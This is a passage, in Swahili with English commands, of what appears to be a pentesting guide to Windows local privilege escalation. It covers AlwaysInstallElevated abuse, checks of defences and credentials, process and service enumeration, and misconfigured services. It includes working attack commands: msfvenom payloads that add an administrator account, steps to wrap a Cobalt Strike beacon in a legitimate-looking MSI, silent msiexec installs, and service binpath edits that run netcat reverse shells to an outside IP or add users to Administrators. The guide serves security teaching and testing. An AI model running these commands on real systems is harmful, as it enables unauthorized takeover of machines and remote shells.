Kwa maelezo zaidi kuhusu mtiririko wa shambulio, angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ikiwa** registry keys hizi 2 **zimewashwa** (thamani ni **0x1**), basi watumiaji wa kiwango chochote cha privilege wanaweza **kusakinisha** (kutekeleza) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ikiwa una session ya meterpreter, unaweza kuendesha technique hii kiotomatiki kwa kutumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia command ya `Write-UserAddMSI` kutoka power-up kuunda faili ya Windows MSI binary ndani ya directory ya sasa ili kuongeza privileges. Script hii huandika installer ya MSI iliyokompiliwa awali inayoomba kuongeza user/group (kwa hiyo utahitaji ufikiaji wa GIU):

```
Write-UserAddMSI
```

Tekeleza tu binary iliyoundwa ili kuongeza privileges.

### MSI Wrapper

Soma tutorial hii ili ujifunze jinsi ya kuunda MSI wrapper kwa kutumia zana hizi. Kumbuka kwamba unaweza kufunga faili ya "**.bat**" ikiwa **unataka tu** **kutekeleza** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Tengeneza** payload mpya ya Windows EXE TCP katika `C:\privesc\beacon.exe` kwa kutumia Cobalt Strike au Metasploit
- Fungua **Visual Studio**, chagua **Create a new project** na uandike "installer" kwenye kisanduku cha utafutaji. Chagua mradi wa **Setup Wizard** kisha ubofye **Next**.
- Ipe mradi jina, kama vile **AlwaysPrivesc**, tumia **`C:\privesc`** kama eneo, chagua **place solution and project in the same directory**, kisha ubofye **Create**.
- Endelea kubofya **Next** hadi ufike hatua ya 3 kati ya 4 (chagua faili za kujumuisha). Bofya **Add** na uchague payload ya Beacon uliyotengeneza hivi punde. Kisha bofya **Finish**.
- Angazia mradi wa **AlwaysPrivesc** kwenye **Solution Explorer** na kwenye **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
  - Kuna properties nyingine unazoweza kubadilisha, kama vile **Author** na **Manufacturer**, ili kufanya app iliyosakinishwa ionekane halali zaidi.
- Bofya mradi kwa kitufe cha kulia na uchague **View > Custom Actions**.
- Bofya **Install** kwa kitufe cha kulia na uchague **Add Custom Action**.
- Bofya mara mbili **Application Folder**, chagua faili yako ya **beacon.exe** kisha ubofye **OK**. Hii itahakikisha kwamba payload ya beacon inatekelezwa mara tu installer inapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwisho, **ijenge**.
  - Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` litaonyeshwa, hakikisha umeweka platform kuwa x64.

### MSI Installation

Ili kutekeleza **usakinishaji** wa faili hasidi ya `.msi` **chinichini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Ili kutumia exploit hii, unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

Mipangilio hii huamua kinachorekodiwa, kwa hivyo unapaswa kuizingatia **kwa makini**.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, ni muhimu kujua logs zinatumwa wapi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Administrator wa ndani**, na kuhakikisha kuwa kila nywila ni **ya kipekee, imetengenezwa kwa nasibu, na inasasishwa mara kwa mara** kwenye kompyuta zilizojiunga na domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, hivyo kuwaruhusu kuona nywila za admin wa ndani iwapo wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewezeshwa, **nywila za maandishi wazi huhifadhiwa kwenye LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Ulinzi wa LSA

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioboreshwa wa Local Security Authority (LSA) ili **kuzuia** michakato isiyoaminika **kusoma kumbukumbu yake** au kuingiza msimbo, na hivyo kuimarisha usalama wa mfumo.\
[**Maelezo zaidi kuhusu Ulinzi wa LSA hapa**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Lengo lake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama vile mashambulizi ya pass-the-hash. [**Maelezo zaidi kuhusu Credential Guard yanapatikana hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Vitambulisho Vilivyohifadhiwa kwenye Akiba

**Vitambulisho vya kikoa** huthibitishwa na **Local Security Authority** (LSA) na kutumiwa na vipengele vya mfumo wa uendeshaji. Data ya kuingia ya mtumiaji inapothibitishwa na kifurushi cha usalama kilichosajiliwa, kwa kawaida huanzishwa vitambulisho vya kikoa vya mtumiaji.\
[**Maelezo zaidi kuhusu Vitambulisho Vilivyohifadhiwa kwenye Akiba hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Watumiaji na Vikundi

### Orodhesha Watumiaji na Vikundi

Unapaswa kuangalia ikiwa vikundi vyovyote unavyoshiriki vina ruhusa za kuvutia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Vikundi vyenye privileges

Ikiwa **upo katika kikundi fulani chenye privileges, unaweza kuongeza privileges**. Jifunze kuhusu vikundi vyenye privileges na jinsi ya kuvitumia vibaya ili kuongeza privileges hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Jifunze zaidi** kuhusu **token** ni nini kwenye ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu tokens za kuvutia** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Sessions

```bash
qwinsta
klist sessions
```

### Folda za nyumbani

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Sera ya Nenosiri

```bash
net accounts
```

### Pata yaliyomo kwenye ubao wa kunakili

```bash
powershell -command "Get-Clipboard"
```

## Michakato Inayoendeshwa

### Ruhusa za Faili na Folda

Kwanza kabisa, unapoorodhesha michakato, **angalia kama kuna nywila ndani ya command line ya mchakato**.\
Angalia kama unaweza **kubatilisha binary inayoendeshwa** au kama una ruhusa za kuandika kwenye folda ya binary ili kutumia [**DLL Hijacking attacks**](dll-hijacking/index.html) zinazowezekana:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Daima kagua kama kuna [**electron/cef/chromium debuggers** zinazoendeshwa; unaweza kuzitumia vibaya ili kuongeza privileges](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Debugger listener inaweza kuwepo kwa muda mfupi, kwa hivyo kutokuwepo kwake kwenye snapshot moja ya passive ya ports hakuthibitishi kuwa haikuwahi kufichuliwa. Linganisha listener yoyote uliyoona na PID yake, mmiliki wa process, na uwezo wa mtumiaji mwenye privileges za chini kuifikia; jina la programu au debug flag pekee havithibitishi uwezo wa kutekeleza code kati ya watumiaji tofauti. Fanya enumeration ya kawaida kwa njia ya passive badala ya kutuma debugger commands.

**Kukagua permissions za binaries za processes**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Kukagua ruhusa za folda zilizo na faili za binary za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Saraka za dynamic preprocessor za Snort

Snort 2 inaweza kupakia maktaba zinazoshirikiwa kutoka kwenye `dynamicpreprocessor directory` iliyotajwa kwenye usanidi uliochaguliwa kwa `snort.exe -c <config>`. Kwa scheduled task au service inayoendesha Snort chini ya akaunti tofauti, kagua usanidi huo mahususi na ACL ya saraka ya moduli iliyotajwa. Ikiwa tokeni yako inaweza kuunda faili humo, njia hiyo inafaa kukaguliwa kama uwezekano wa kutekeleza code wakati task au service hiyo itakapopakia moduli tena. Thibitisha ruhusa halisi za akaunti ya run-as, usanidi unaotumika, ulinganifu wa moduli, na vizuizi vyovyote vya deny au share; saraka inayoweza kuandikika pekee haithibitishi escalation. [Hati za Snort za dynamic-preprocessor](https://www.snort.org/documents/dpx-readme) zinaeleza upakiaji wa moduli wakati wa runtime.

### Web service yenye upendeleo na document root inayoweza kuandikika

Kwenye usakinishaji wa Apache wa Windows, linganisha njia ya executable ya service na akaunti inayoendesha service hiyo na `DocumentRoot` katika `httpd.conf` inayotumika. Kwa mpangilio wa kawaida wa XAMPP, kagua `C:\xampp\apache\conf\httpd.conf` na ACL ya document root iliyosanidiwa, ambayo mara nyingi ni `C:\xampp\htdocs`. Ikiwa mtumiaji mwenye upendeleo mdogo anaweza kuunda faili kwenye root hiyo huku Apache ikiendeshwa kama `LocalSystem`, utekelezaji wa code upande wa server unaweza kuvuka mpaka wa upendeleo wa host. Thibitisha kuwa service inaendeshwa, njia halisi inatolewa, na handler ya upande wa server inachakata aina hiyo ya faili; root inayoweza kuandikika peke yake inathibitisha tu kuwa faili zinaweza kuundwa. Kagua ACL bila kuandika faili ya majaribio:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Kwa usakinishaji wa kawaida wa WAMP, service inaweza kuelekeza kwenye toleo maalum la `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (au `C:\wamp\...` kwa mpangilio wa biti 32), huku usanidi ukiwa karibu nayo chini ya `conf\httpd.conf` na root chaguomsingi ikiwa `C:\wamp64\www` au `C:\wamp\www`. Kagua kwa pamoja image halisi ya service, utambulisho inayotumia kuendesha, `DocumentRoot` inayotumika (ikiwemo upanuzi wa `${INSTALL_DIR}` na overrides za virtual-host), na ACL ya root. Saraka ya WAMP inayoweza kuandikwa haithibitishi kwamba Apache inaendeshwa kama `SYSTEM` au kwamba inatekeleza faili iliyowasilishwa. [Apache inaeleza jinsi service ya Windows huchagua usanidi wake](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Root ya IIS inayoweza kuandikwa na utambulisho wa mtandao wa application-pool

Kwa IIS, linganisha saraka halisi inayoweza kuandikwa na **site/application inayotumika** katika `applicationHost.config`, kisha tambua pool yake iliyosanidiwa na handler ya upande wa server. Code iliyowekwa kwenye saraka inayotolewa huendeshwa kama pool tu ikiwa IIS inachakata aina hiyo ya faili na route inafikika. Kagua ruhusa za sasa za mtumiaji za kuunda faili, hali ya runtime ya site, handler na overrides za kila path kabla ya kuchukulia saraka inayoweza kuandikwa kama njia ya kutekeleza code.

Dynamic compilation ya ASP.NET huleta njia tofauti ya kukagua: faili zinazozalishwa chini ya saraka ya compilation ya application. Chaguomsingi ni saraka ya `Temporary ASP.NET Files` chini ya usakinishaji husika wa .NET Framework, lakini `<compilation tempDirectory>` ya application inaweza kuibadilisha. [Microsoft inaeleza mahali ilipo na subdirectory za kila application](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) na [inapendekeza kutenga saraka za compilation wakati application pools haziaminiani](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ikiwa token yenye ruhusa za chini inaweza kubadilisha source iliyozalishwa kwenye cache ya application **maalum**, bainisha kama application hiyo inaikompile upya chini ya [utambulisho wa worker-process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) wenye ruhusa za juu zaidi. ACL ya faili au saraka pekee haithibitishi utekelezaji wa code: linganisha cache na application inayotumika, token na ACL zinazotumika, mipangilio ya compilation, utambulisho wa process, na muda wa compilation upya. Tumia ukaguzi wa metadata wa kusoma pekee; usianzisha compilation wala kubadilisha faili za cache wakati wa enumeration.

Pool ya IIS iliyosanidiwa kama `ApplicationPoolIdentity` au `NetworkService` kwa kawaida hujithibitisha kwa kutumia **akaunti ya kompyuta ya host** inapofikia rasilimali za domain, ingawa token yake ya ndani inaweza kuwa na ruhusa za chini. `LocalSystem` tayari ina ruhusa za juu sana ndani ya kompyuta na pia hutumia akaunti ya kompyuta kwenye mtandao; `LocalService` kwa kawaida hutumia credentials za mtandao zisizojulikana. Pool ya `SpecificUser` hutumia akaunti yake iliyosanidiwa. [Microsoft inaeleza aina hizi za utambulisho](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) na [utambulisho wa mtandao wa application-pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Mpangilio wa utambulisho usioainishwa unaweza kurithi chaguomsingi za pool, ambazo hutofautiana kati ya vizazi vya IIS, kwa hiyo tambua usanidi unaotumika badala ya kubashiri kutokana na jina la pool. Ikiwa utekelezaji wa code unafikia pool yenye utambulisho wa mtandao wa akaunti ya kompyuta, tathmini ruhusa za directory za **kompyuta hiyo mahususi**. [DCSync](../active-directory-methodology/dcsync.md) inahitaji ruhusa za replication kwenye domain naming context; tiketi ya akaunti ya mashine au jukumu la host pekee havithibitishi ruhusa hizo. Enumeration tulivu inapaswa kukagua usanidi na ACL bila kupakia faili, kufanya uthibitishaji wa mtandao, au kuomba tiketi.

Kwa handler ya ASP.NET inayosomeka na kuanzisha helper process, fuatilia thamani yoyote inayotokana na request kupitia authentication, decryption, validation, na uundaji wa command. Handler inayounganisha token iliyodecodewa kwenye `ProcessStartInfo("cmd", "/c ...")` inaweza kuruhusu shell metacharacters kubadilisha command; [Microsoft inaeleza herufi maalum za `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Thibitisha kwamba mpigaji asiyeaminika anaweza kuathiri thamani iliyodecodewa na kufikia handler, kisha tambua utambulisho unaotumika wa application-pool au wa impersonation na utambulisho wa child process. Mstari wa source unaosomeka, listener ya localhost, au udhaifu wa muundo wa token pekee havithibitishi utekelezaji wa command wenye ruhusa za juu. Kagua source na usanidi wa pool bila kutuma requests zilizoghushiwa au kuendesha helper wakati wa enumeration tulivu.

Kwa PHP service kwenye Windows, path inayodhibitiwa na request na kupitishwa kwa [`include` au `require`](https://www.php.net/manual/en/function.include.php) inaweza kutekeleza faili ya PHP inayoweza kuandikwa na mtumiaji wa kiwango cha chini chini ya utambulisho wa worker. Thibitisha kwamba request inaweza kufikia statement hiyo, path iliyotatuliwa inataja faili ambayo mtumiaji wa kiwango cha chini anaweza kubadilisha na worker anaweza kusoma, vizuizi husika vya PHP path vinaruhusu include, na worker inaendeshwa kwa ruhusa za juu zaidi. Listener ya loopback au faili inayoweza kuandikwa pekee haithibitishi mnyororo huu; kagua source, utambulisho wa service, na ACL za faili bila kuita endpoint wakati wa enumeration tulivu.

### Uchimbaji wa Nywila kwenye Kumbukumbu

Unaweza kuunda memory dump ya process inayoendeshwa ukitumia **procdump** kutoka sysinternals. Services kama FTP huwa na **credentials katika maandishi ya kawaida kwenye kumbukumbu**; jaribu kutupa kumbukumbu na kusoma credentials.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Programu za GUI zisizo salama

**Programu zinazoendeshwa kama SYSTEM zinaweza kumruhusu mtumiaji kufungua CMD au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

### Uingizaji wa faili za mradi zenye ruhusa za juu

Programu inayofungua kiotomatiki miradi kutoka kwenye saraka ya kuweka faili ambayo mtumiaji mwenye ruhusa za chini anaweza kuandika ndani yake, huvuka mpaka wa uaminifu wa ingizo chini ya akaunti ya programu inayoingiza faili hizo. Kagua **njia halisi inayoweza kuandikika**, mchakato au task inayoifungua, utambulisho wake unaotumika, na build ya parser. [Tatizo la kihistoria la kufungua/kurejesha mradi wa Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) liliruhusu XML external entities kwenye metadata ya mradi; entity ya mtandao kwenye Windows inaweza kusababisha uthibitishaji kutoka kwa akaunti inayoingiza faili ikiwa [sera za SMB na NTLM zinazotoka nje](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) zinaruhusu. Hii ni ishara ya uwezekano wa kufichua credentials, si ufikiaji wa msimamizi wa moja kwa moja: majibu lazima yaweze kutumiwa kupitia njia tofauti iliyoidhinishwa au yenye udhaifu, na build za sasa lazima zikaguliwe kulingana na hali halisi ya patch. Usifungue mradi uliotengenezwa kwa makusudi wakati wa enumeration tulivu; kagua mtiririko wa uingizaji na ACLs.

## Huduma

Haki ya [`SC_MANAGER_CREATE_SERVICE` ya kitu cha Service Control Manager (SCM)](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) ni tofauti na haki za huduma iliyopo. Ombi la ufikiaji la kusoma pekee la [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) lililofanikiwa kwa haki hiyo ni ishara ya kuchunguza, si uthibitisho kwamba huduma mpya inaweza kuendeshwa. [`CreateService` hurejesha handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) yenye haki za ufikiaji wa huduma zilizoombwa wakati wa uundaji; kufungua tena huduma baadaye hufanya ukaguzi tofauti wa ufikiaji na kunaweza kushindwa hata kama handle ya awali ingeweza kutumiwa. Thibitisha kando tokeni inayotumika ya ndani au ya mbali, haki za handle zilizotolewa, akaunti ya huduma, sera ya kuanzisha, na njia ya executable. Usitengeneze wala kuanzisha huduma wakati wa enumeration tulivu.

Kwa njia ya kusakinisha huduma kwa mbali, linganisha haki hizo za SCM na share kwenye lengwa ambayo **logon hiyo hiyo ya mtandao** inaweza kuiandikia, ACL yake ya msingi ya NTFS, na njia ya ndani ya executable ambayo akaunti ya huduma inaweza kuendesha. Akaunti isiyo ya msimamizi inaweza kuvuka mpaka huu ikiwa kuna haki pana isivyo kawaida za SCM na njia ya kuweka faili; share ya msimamizi si sharti la lazima. Ufikiaji wa kuandika kwenye share pekee, au ishara ya ruhusa ya kuunda huduma kwenye SCM pekee, hauthibitishi kwamba huduma mpya inaweza kuanzishwa chini ya utambulisho wa juu zaidi.

Huduma iliyopo inaweza kuita executable saidizi wakati wa kuanzishwa, kuzimwa, au tukio jingine la mzunguko wa maisha, hata kama executable hiyo haipo kwenye `ImagePath` yake. Ikiwa jina la executable saidizi linatafutwa kwenye saraka ambayo mtumiaji mwenye ruhusa za chini anaweza kuandikia, na huduma inaendeshwa chini ya utambulisho wa juu zaidi, faili saidizi inayokosekana inaweza kuwa mgombea wa kubadilishwa kwa masharti. Thibitisha **msimbo halisi wa huduma au mwito wa saidizi ulioandikwa kwenye nyaraka**, njia ya executable iliyotatuliwa na mpangilio wa utafutaji, haki za kuunda saraka, utambulisho wa huduma, na kichochezi cha mzunguko wa maisha kinachopatikana. Saraka ya huduma inayoweza kuandikika au faili inayokosekana pekee havithibitishi kwamba huduma itapakia faili hiyo; ukaguzi tulivu haupaswi kuanzisha wala kusimamisha huduma.

Kwa huduma iliyopo, [`SERVICE_START` inaruhusu kutoa hoja kwa `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); ni tofauti na [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Kagua msimbo wa huduma au kiolesura chake kilichoandikwa kwenye nyaraka kabla ya kuhesabu ruhusa ya kuianzisha kuwa zaidi ya haki ya udhibiti. Ikiwa hutumia hoja iliyochaguliwa na mpigaji kama njia ya logi au export, thibitisha utambulisho wa huduma, mtiririko halisi kutoka kwenye hoja hadi kwenye uandishi, vizuizi vya njia, na ruhusa za **faili iliyoundwa**. Kuandika kwenye saraka iliyolindwa kunaweza kusababisha escalation tu ikiwa kuna consumer au loader tofauti yenye ruhusa za juu inayokubali faili hiyo; logi inayoweza kuandikika au haki ya kuanzisha huduma pekee havitoshi. Orodha ya huduma tulivu haipaswi kuanzisha huduma wala kuunda faili ya majaribio.

Kwa agent ya ufuatiliaji ya NSClient++, `nsclient.ini` inayoweza kusomwa ni **ishara ya kukagua usanidi**: huenda ikawa na credentials za wavuti, ilhali `boot.ini` inaweza kuelekeza usanidi kwenye eneo jingine. Kagua akaunti halisi ya huduma, listener ya WEB na sera ya ufikiaji, na kama role iliyothibitishwa inaweza kubadilisha mipangilio au scripts. Utekelezaji wenye ruhusa za juu pia unahitaji `CheckExternalScripts` (au njia nyingine ya utekelezaji iliyowezeshwa), haki inayotumika ya kusajili au kurekebisha amri, na kichochezi kinachoendesha amri hiyo chini ya utambulisho wa huduma. Listener inayopatikana kwenye loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani, lakini njia ya faili, password, au listener pekee havithibitishi haki hizo. Kagua metadata na ruhusa bila kuonyesha siri au kuita web API wakati wa enumeration tulivu. Tazama [mpangilio wa faili za NSClient++](https://nsclient.org/docs/concepts/file-layout/), [mwongozo wa usalama wa wavuti na scripts](https://nsclient.org/docs/setup/securing/), na [usanidi wa external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Kwa huduma ambayo `ImagePath` yake ni `nssm.exe`, kagua akaunti halisi ya huduma inayotumika na thamani yake ya `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM huhifadhi programu ya child hapo](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), huku `AppDirectory` ikiwa saraka yake ya kufanya kazi iliyosanidiwa. Kagua executable ya child na ACLs za saraka zake za juu kabla ya kuchukulia ruhusa za wrapper kuwa ndizo zinazowakilisha mpaka mzima wa huduma. Endpoint ya ndani ya WCF au SOAP inayofichuliwa na child hiyo ni ishara tofauti ya kuchunguza: thibitisha kwamba mtumiaji mwenye ruhusa za chini anaweza kufikia listener, kwamba operation husika inakubali ingizo lake, na kwamba child ya huduma hutekeleza operation isiyo salama chini ya utambulisho wa juu zaidi. Akaunti ya huduma, URL ya endpoint, au njia inayoweza kuandikika pekee havithibitishi escalation; epuka kuita operations za huduma wakati wa enumeration tulivu.

Kwa operation maalum ya WCF, fuatilia string inayodhibitiwa na mpigaji hadi kwenye PowerShell runspace yoyote. [`Pipeline.Commands.AddScript` huongeza maandishi ya script](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), na [`Pipeline.Invoke` huendesha pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` yenye credentials za Windows transport](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) huthibitisha utambulisho wa client, lakini ruhusa ya kuita operation **hiyo mahususi** na utambulisho unaotumika wa runspace lazima vikaguliwe kando. Njia kutoka kwenye ingizo la mpigaji mwenye ruhusa za chini hadi `AddScript` chini ya utambulisho wa huduma wenye ruhusa za juu ni mpaka wa utekelezaji wa msimbo; port inayosikilizwa, client iliyothibitishwa, au method isiyotumika kwenye assembly isiyohusiana pekee si uthibitisho. Kagua huduma iliyowekwa, contract, ruhusa, na mipangilio ya impersonation kwa njia tuli bila kuita endpoint wakati wa enumeration.

Service Triggers huruhusu Windows kuanzisha huduma hali fulani zinapotokea (shughuli ya named pipe/RPC endpoint, matukio ya ETW, upatikanaji wa IP, kifaa kuunganishwa, GPO refresh, n.k.). Hata bila haki za SERVICE_START, mara nyingi unaweza kuanzisha huduma zenye ruhusa za juu kwa kuwasha triggers zake. Tazama mbinu za enumeration na activation hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Huduma ya Visual Studio ya kukusanya taarifa za uchunguzi

Usakinishaji wa Visual Studio wenye zana za C/C++ unaweza kujumuisha `VSStandardCollectorService150`, huduma ya uchunguzi iliyosanidiwa kuendeshwa kama `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) ilitumia race ya junction na object-manager-link kuelekeza upya uwekaji upya wa DACL ya huduma. Escalation iliyoonyeshwa pia ilihitaji njia inayoweza kutumika ya kurekebisha MSI kupitia Visual Studio Setup WMI Provider na lengwa lake la `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Kipengele hicho kilirekebishwa Januari 2024.

Kwa uchunguzi wa awali tulivu, kagua akaunti na njia ya binary ya huduma hiyo, angalia kama njia ya Setup WMI compiler ipo, na thibitisha hali ya patch ya kipengele kilichosakinishwa. Ingizo la huduma, toleo la bidhaa ya Visual Studio, au faili ya compiler pekee havithibitishi kuwa mashine ina udhaifu. Ukaguzi hauhitaji kuanzisha huduma au kuendesha repair.

Pata orodha ya huduma:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Ruhusa

Unaweza kutumia **sc** kupata taarifa za huduma.

```bash
sc qc <service_name>
```

Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kukagua kiwango cha ruhusa kinachohitajika kwa kila service.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Inapendekezwa kuangalia kama "Authenticated Users" wanaweza kurekebisha huduma yoyote:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Unaweza kupakua accesschk.exe ya XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Washa huduma

Ukikumbana na hitilafu hii (kwa mfano, kwenye SSDPSRV):

_Hitilafu ya mfumo 1058 imetokea._\
_Huduma haiwezi kuwashwa kwa sababu imezimwa au hakuna vifaa vilivyowashwa vinavyohusishwa nayo._

Unaweza kuiwasha kwa kutumia

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Zingatia kwamba huduma ya upnphost inategemea SSDPSRV ili ifanye kazi (kwa XP SP1)**

**Njia nyingine ya kukwepa** tatizo hili ni kuendesha:

```
sc.exe config usosvc start= auto
```

### **Rekebisha njia ya binary ya service**

Katika hali ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye service, inawezekana kurekebisha binary inayotekelezwa ya service. Ili kurekebisha na kutekeleza **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Washa upya huduma

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privileges zinaweza kuongezwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Huruhusu kubadilisha usanidi wa binary ya service.
